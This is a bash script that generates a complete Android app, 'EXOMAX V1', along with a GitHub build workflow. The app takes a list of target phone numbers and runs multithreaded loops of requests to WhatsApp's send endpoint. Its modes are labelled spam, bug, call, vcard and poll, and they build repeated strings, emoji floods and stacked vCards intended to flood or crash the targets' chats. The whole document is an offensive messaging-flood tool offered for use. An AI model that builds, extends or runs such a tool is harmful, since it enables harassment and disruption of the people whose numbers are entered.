#!/bin/bash
# ============================================================
#  EXOMAX V1 — SETUP ALL-IN-ONE
#  Author : Vermeil
#  Cara   : chmod +x setup.sh && ./setup.sh
# ============================================================
set -e
PROJ="exomax-v1"
mkdir -p "$PROJ" && cd "$PROJ"
mkdir -p app/src/main/java/com/exomax/v1
mkdir -p app/src/main/res/layout app/src/main/res/values
mkdir -p .github/workflows

cat > settings.gradle <<'EOF'
rootProject.name = "ExomaxV1"
include ':app'
EOF

cat > build.gradle <<'EOF'
buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
}
allprojects { repositories { google(); mavenCentral() } }
EOF

cat > gradle.properties <<'EOF'
org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
EOF

cat > .gitignore <<'EOF'
*.iml
.gradle
/local.properties
/.idea
/build
EOF

cat > app/build.gradle <<'EOF'
plugins { id 'com.android.application' }
android {
    namespace 'com.exomax.v1'
    compileSdk 34
    defaultConfig {
        applicationId "com.exomax.v1"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
}
EOF

cat > app/proguard-rules.pro <<'EOF'
-keep class com.exomax.v1.** { *; }
-dontwarn okhttp3.**
EOF

cat > app/src/main/AndroidManifest.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <application
        android:allowBackup="true"
        android:label="EXOMAX V1"
        android:supportsRtl="true"
        android:theme="@style/Theme.Material3.DayNight"
        android:usesCleartextTraffic="true">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

cat > app/src/main/res/values/strings.xml <<'EOF'
<resources>
    <string name="app_name">EXOMAX V1</string>
</resources>
EOF

cat > app/src/main/res/layout/activity_main.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0A0A0F"
    android:padding="16dp">
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical">
    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="EXOMAX V1"
        android:textColor="#00FFC8"
        android:textSize="22sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="12dp"/>
    <EditText android:id="@+id/etTargets"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="628xxx, 628yyy"
        android:textColor="#E0E0E0"
        android:textColorHint="#555"
        android:background="#14141E"
        android:padding="12dp"
        android:minLines="3"
        android:gravity="top"
        android:inputType="textMultiLine"/>
    <EditText android:id="@+id/etMsg"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="LovYou"
        android:textColor="#E0E0E0"
        android:background="#14141E"
        android:padding="12dp"
        android:layout_marginTop="8dp"/>
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="horizontal"
        android:layout_marginTop="8dp">
        <EditText android:id="@+id/etCount"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="10"
            android:inputType="number"
            android:textColor="#E0E0E0"
            android:background="#14141E"
            android:padding="12dp"/>
        <EditText android:id="@+id/etDelay"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:layout_marginStart="8dp"
            android:text="800"
            android:inputType="number"
            android:textColor="#E0E0E0"
            android:background="#14141E"
            android:padding="12dp"/>
    </LinearLayout>
    <Spinner android:id="@+id/spMode"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="8dp"
        android:background="#14141E"/>
    <Button android:id="@+id/btnStart"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="MULAI"
        android:layout_marginTop="12dp"
        android:backgroundTint="#7B2FF7"/>
    <Button android:id="@+id/btnStop"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="STOP"
        android:layout_marginTop="6dp"
        android:backgroundTint="#FF006E"/>
    <TextView android:id="@+id/tvStats"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:textColor="#00FFC8"
        android:textSize="12sp"
        android:padding="8dp"
        android:text="sent:0 fail:0 rate:0/s"/>
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="200dp"
        android:layout_marginTop="8dp"
        android:background="#07070C">
        <TextView android:id="@+id/tvLog"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:textColor="#9AC8FF"
            android:fontFamily="monospace"
            android:textSize="11sp"
            android:padding="8dp"/>
    </ScrollView>
</LinearLayout>
</ScrollView>
EOF

cat > app/src/main/java/com/exomax/v1/ModeAdapter.java <<'EOF'
package com.exomax.v1;
import android.content.Context;
import android.view.*;
import android.widget.*;
public class ModeAdapter extends ArrayAdapter<String> {
    public ModeAdapter(Context c, String[] items){
        super(c, android.R.layout.simple_spinner_item, items);
        setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    }
    @Override public View getView(int pos, View cv, ViewGroup parent){
        TextView tv = (TextView) super.getView(pos, cv, parent);
        tv.setTextColor(0xFFE0E0E0);
        return tv;
    }
}
EOF

cat > app/src/main/java/com/exomax/v1/WAClient.java <<'EOF'
package com.exomax.v1;
import okhttp3.*;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.concurrent.TimeUnit;
public class WAClient {
    private final OkHttpClient http;
    private static final String UA =
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36";
    public WAClient(){
        http = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .followRedirects(true)
            .build();
    }
    public boolean send(String num, String payload, String mode){
        String text = buildPayload(num, payload, mode);
        String url = "https://api.whatsapp.com/send?phone=" + num +
                     "&text=" + URLEncoder.encode(text);
        Request req = new Request.Builder()
            .url(url)
            .header("User-Agent", UA)
            .header("Accept-Language", "id-ID,id;q=0.9,en;q=0.8")
            .get()
            .build();
        for (int i = 0; i < 3; i++){
            try (Response r = http.newCall(req).execute()){
                if (r.isSuccessful() || r.code() == 302 || r.code() == 200) return true;
            } catch (IOException ignored){}
            try { Thread.sleep(400L * (i+1)); } catch (InterruptedException ignored){}
        }
        return false;
    }
    String buildPayload(String num, String payload, String mode){
        switch (mode){
            case "bug": {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 80; i++) sb.append("LovYou");
                return sb.toString();
            }
            case "call": {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 200; i++) sb.append("\u260E");
                return sb.toString();
            }
            case "vcard": {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 50; i++){
                    sb.append("BEGIN:VCARD\nVERSION:3.0\nFN:x\nTEL:")
                      .append(num).append("\nEND:VCARD\n");
                }
                return sb.toString();
            }
            case "poll": {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 120; i++) sb.append("\uD83D\uDCCA");
                return sb.toString();
            }
            default:
                return payload;
        }
    }
}
EOF

cat > app/src/main/java/com/exomax/v1/MainActivity.java <<'EOF'
package com.exomax.v1;
import android.os.*;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
public class MainActivity extends AppCompatActivity {
    EditText etTargets, etMsg, etCount, etDelay;
    Spinner spMode;
    Button btnStart, btnStop;
    TextView tvLog, tvStats;
    volatile boolean running = false;
    AtomicInteger sent = new AtomicInteger(0);
    AtomicInteger fail = new AtomicInteger(0);
    long tStart = 0;
    String[] MODES = {"spam","bug","call","vcard","poll"};
    WAClient client;
    @Override protected void onCreate(Bundle b){
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        etTargets = findViewById(R.id.etTargets);
        etMsg     = findViewById(R.id.etMsg);
        etCount   = findViewById(R.id.etCount);
        etDelay   = findViewById(R.id.etDelay);
        spMode    = findViewById(R.id.spMode);
        btnStart  = findViewById(R.id.btnStart);
        btnStop   = findViewById(R.id.btnStop);
        tvLog     = findViewById(R.id.tvLog);
        tvStats   = findViewById(R.id.tvStats);
        spMode.setAdapter(new ModeAdapter(this, MODES));
        client = new WAClient();
        btnStart.setOnClickListener(v -> start());
        btnStop.setOnClickListener(v -> { running = false; log("[!] stop"); });
    }
    List<String> parseTargets(){
        String raw = etTargets.getText().toString();
        List<String> out = new ArrayList<>();
        for (String s : raw.split("[,\\n]+")){
            String n = s.replaceAll("\\D","").trim();
            if (n.length() < 8) continue;
            if (n.startsWith("0")) n = "62" + n.substring(1);
            out.add(n);
        }
        return out;
    }
    void start(){
        List<String> targets = parseTargets();
        if (targets.isEmpty()){ log("[x] target kosong"); return; }
        String payload = etMsg.getText().toString();
        int count = parseInt(etCount.getText().toString(), 10);
        int delay = parseInt(etDelay.getText().toString(), 800);
        String mode = MODES[spMode.getSelectedItemPosition()];
        running = true; sent.set(0); fail.set(0);
        tStart = System.currentTimeMillis(); tvLog.setText("");
        log("[+] EXOMAX V1 | mode=" + mode + " target=" + targets.size());
        ExecutorService pool = Executors.newFixedThreadPool(5);
        for (String t : targets){
            pool.submit(() -> {
                for (int i = 0; i < count && running; i++){
                    boolean ok = client.send(t, payload, mode);
                    if (ok) sent.incrementAndGet(); else fail.incrementAndGet();
                    ui(() -> { log((ok?"[ok] ":"[x] ")+t); updateStats(); });
                    try { Thread.sleep(delay); } catch (InterruptedException ignored){}
                }
            });
        }
        pool.shutdown();
        new Thread(() -> {
            try { pool.awaitTermination(1, TimeUnit.HOURS); } catch (Exception ignored){}
            running = false;
            ui(() -> log("[+] selesai. sent="+sent.get()+" fail="+fail.get()));
        }).start();
    }
    int parseInt(String s, int def){
        try { return Integer.parseInt(s.trim()); } catch (Exception e){ return def; }
    }
    void updateStats(){
        long el = (System.currentTimeMillis() - tStart) / 1000;
        int rate = el > 0 ? (int)(sent.get() / el) : 0;
        tvStats.setText("sent:"+sent.get()+" fail:"+fail.get()+" rate:"+rate+"/s");
    }
    void log(String msg){
        String t = new java.text.SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                .format(new Date());
        tvLog.append("["+t+"] "+msg+"\n");
    }
    void ui(Runnable r){ new Handler(Looper.getMainLooper()).post(r); }
}
EOF

cat > .github/workflows/build.yml <<'EOF'
name: Build EXOMAX V1
on:
  push:
    branches: [ main ]
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17' }
      - uses: android-actions/setup-android@v3
      - name: Wrapper
        working-directory: exomax-v1
        run: gradle wrapper --gradle-version 8.2
      - name: Build
        working-directory: exomax-v1
        run: |
          chmod +x ./gradlew
          ./gradlew assembleRelease
      - uses: actions/upload-artifact@v4
        with:
          name: EXOMAX-V1
          path: exomax-v1/app/build/outputs/apk/release/*.apk
EOF

cd ..
git init -q && git add . && git commit -q -m "init: EXOMAX V1" && git branch -M main
echo "[+] siap: $(pwd)/$PROJ"